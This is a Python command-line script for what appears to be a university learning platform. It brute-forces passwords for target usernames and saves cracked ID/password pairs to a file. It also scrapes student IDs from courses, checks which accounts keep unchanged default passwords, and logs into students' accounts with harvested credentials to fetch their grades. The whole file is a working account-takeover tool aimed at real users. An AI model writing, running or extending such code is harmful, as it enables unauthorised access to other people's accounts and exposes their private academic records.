from main_help import generate_list, get_unchanged, login, dir_path
from driver_help import get_grades
import argparse
import json
from course import get_students_from_course
from ndhureq import brute


helpdoc = json.load(open("helpdoc/helpdoc.json",))
parser = argparse.ArgumentParser(description=helpdoc["desc"])
parser.add_argument('--idlist', type=dir_path, help=helpdoc["list"])
parser.add_argument('--check-change', action='store_true')
parser.add_argument('--generate-list', action='store_true', help=helpdoc["genlist"])
parser.add_argument('--skip-try', action='store_true', help=helpdoc["skiptry"])
parser.add_argument('--get-grades', action='store_true', help=helpdoc["getgrades"])
parser.add_argument('--browser', type=str, default='firefox', help=helpdoc["browser"])
parser.add_argument('--lang', type=str, help=helpdoc["lang"])
parser.add_argument('--get-students', action='store_true')
parser.add_argument('--semester', type=str)
parser.add_argument('--course', type=str)
parser.add_argument('--user', type=str)
parser.add_argument('--pw', type=str)
parser.add_argument('--requests', action="store_true")
parser.add_argument('--idpwlist', type=dir_path)
parser.add_argument('--assignment', type=str)

args = parser.parse_args()

print(args)


if args.requests:
    candidates = []
    if args.idlist:
        print(f"Importing list from: '{args.idlist}'")
        with open(args.idlist, 'r') as input_file:
            entries = input_file
            for entry in entries:
                candidates.append(entry.strip())
            print('IDs found in list: ')
            print(candidates)
    elif args.user:
        candidates.append(args.user)
    else:
        username = input('Please enter target username: ')
        candidates.append(username)

    found = []
    for cand in candidates:
        new = brute(cand)
        if new:
            found.append(new)
    
    with open(f"found_combinations.txt", "w") as output_file:
        for line in found:
            output_file.write(f"{line}\n")
    
    print("Output file successfully generated.")
    print("Location: found_combinations.txt")
    exit()
    


if args.lang is not None:
    open("helpdoc.json", "w") .write(open(f"helpdoc_{args.lang}.json").read())
    helpdoc = json.load(open("helpdoc.json",))
    print(helpdoc['lang_ok'])
    exit()

candidates = []

if args.get_students == True:
    semester = args.semester if args.semester else input(
        'Please enter desired semester: ')
    course = args.course if args.course else input(
        'Please enter desired course: ')
    user = args.user if args.user else input('Please enter your username: ')
    password = args.pw if args.pw else input(
        f'Please enter your password ({user}): ')
    if password == '':
        password = user

    driver = login(user, password, args.browser)

    student_ids = get_students_from_course(
        driver, args.semester, args.course)
    with open(f"students_{semester.replace(' ', '_')}_{course.replace(' ', '_')}.txt", "w") as output_file:
        for line in student_ids:
            output_file.write("".join(line) + "\n")
    driver.quit()
    print("Students list stored successfully!")
    print(f"Output file: students_{semester.replace(' ', '_')}_{course.replace(' ', '_')}.txt")

if args.idlist:
    print(f"Importing list (only id) from: '{args.idlist}'")
    with open(args.idlist, 'r') as input_file:
        entries = input_file
        for entry in entries:
            candidates.append(entry.strip())
        print('IDs found in list: ')
        print(candidates)
    if args.check_change:
        get_unchanged(candidates, args.browser)
elif args.generate_list:
    candidates = generate_list()
    print('IDs generated: ')
    print(candidates)

if args.idpwlist:
    candidates = []
    print(f"Importing list (id and pw) from '{args.idpwlist}'")
    with open(f"{args.idpwlist}") as input_file:
        entries = input_file.readlines()
        for entry in entries:
            candidates.append(entry.strip())
        print('ID and passwords found in list: ')
        print(candidates)
    if args.get_grades:
        ans = ''
        while ans != 'y' and ans != 'n':
            ans = input('--get-grades is set, do you wish to continue? (y/n) ')
        if ans == 'y':
            semester = args.semester if args.semester else input('Please input target semester: ')
            course = args.course if args.course else input('Please input target course: ')
            assign = args.assignment if args.assignment else input('Please input target assignment: ')
            for entry in candidates:
                username = entry.split(' ')[0]
                password = entry.split(' ')[1]
                print(f"Getting user '{username}' with password '{password}' grades.")
                driver = login(username, password, args.browser)
                get_grades(driver, username, password, semester, course, assign)
            print("Done.")
        elif ans == 'n':
            exit()
